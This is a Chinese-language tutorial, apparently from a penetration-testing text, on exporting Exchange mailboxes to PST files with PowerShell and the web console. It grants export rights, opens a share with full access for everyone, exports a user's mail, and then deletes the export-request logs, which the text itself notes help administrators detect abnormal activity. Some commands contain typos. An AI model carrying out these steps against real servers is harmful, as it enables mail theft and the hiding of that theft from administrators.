Exchange邮件的后缀为.pst。在exchange 2007中导出邮件，需要实验Export.Mailbox命令。在2010SP1版本之后可以使用图形化界面或者powershell。如果要使用PST格式的邮件文件，需要为能够操作的Powershell的用户配置邮箱导入导出权限。

- 配置用户的导入/导出权限

（1）查看用户权限

输入如下命令，查看有导入、导出权限的用户

```
Get-ManagementRoleAssignment -role "Mailbox Import Export" | Format-List RoleAssigneeName 
```

（2）添加权限

将Administrator用户添加到Mailbox Import Export角色组中，就可以通过powershell导出用户的邮件了

```
New-ManagementRoleAssignment -Name "Import Export_Domain Admins" -User "Administrator" -Role "Mailbox Import Export"
```

（3）删除权限

导出工作完成后，可以将刚刚添加到Mailbox Import Export角色组中的用户删除

```
Remove-ManagementRoleAssignment "Import Export_Domain Admins" -Confirm:$false
```

在将用户添加到角色组中后，需要重启Exchange服务器才能执行导出操作。

- 设置网络共享文件夹

不论哪种方式导出邮件，都需要将文件放置在UNC\(Universal Naming Convention,通用命名规则，也称通用命名规范，通用命名规定）路径下。类似与“\\\\hostname\\sharename" "\\\\ipaddress\\sharename"的网络路径角色UNC路径，sharename为网络共享路径。

首先，需要开启共享。在本实验中， 将C盘的inetph文件夹设置为任意用户都可以操作的文件夹，以便将电子邮件从Exchange服务器中导出。输入如下命令：

```
net share inetpub=c:\inetpub /grant:everyone,full
```

在命令行环境中看到提示信息“共享成功”后，输入"net share"命令，就可以看到刚刚创建的共享文件夹了。

- 导出用户的电子邮件

（1）使用powershell导出电子邮件

用户的电子邮箱目录一般分为Inbox（收件箱）、SentItems（已发送邮件）、DeletedItems\(已删除邮件）、Drafts（草稿）等

使用New\-MailboxExportRequest命令，可以将指定用户的所有邮件导出。输入如下命令：

```
New-MaiIboxExportRequest -Mailbox administrator -FilePath \\192.168.100.194\inetpub\administrator.pst
```

可以看到，administrator用户的所有邮件已经被导出到c:\\inetpub中了

（2）通过图形化界面导出电子邮件

在浏览器地址栏中输入“192.168. 100.194\\ecp”，打开Exchange管理中心的登录界面。输人之前添加到Mailbox Import Export角色组中的用户账号和密码，然后单击“登录”按钮

进人Exchang管理中心后，单击“收件人”选项，可以看到当前电子邮箱的信息。单击“\+”按钮，可以将域用户添加到Exchange服务器中。选中现有用户并将其添加到Exchange服务器中

选中现有用户 并将其添加到Exchange服务器中



选中administrator用户，单击“..”按钮，然后选择“导出到PST文件”选项



进入“导出到.pst”" 界面，如下图，单击“浏览”按钮。



此时，就可以导出指定用户的电子邮件了



单机"下一步"按钮，设置导出路径，如下图，该路径为UNC路径。



- 管理导出请求

不论是使用PowerShell导出电子邮件，还是通过图形化界面导出电子邮件，在创建导出请求后，都会在Exchange中留下相关信息：



这些信息有助于Exchange邮件服务器管理人员发现服务器中的异常行为。输入如下命令，使用PowerShell查看之前产生的导出请求记录，如下图。可以看到，之前创建的数个邮箱的导出请求均出现在列表中。

```
Get-MailboxExportRequest
```



使用如下命令，可以将指定用户的已完成导出请求删除：

```
Remove-MailboxExportRequese -Identity Administrator\mailboxexport
```



使用如下命令，可以将所有已完成的导出请求删除：

```
Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest
```

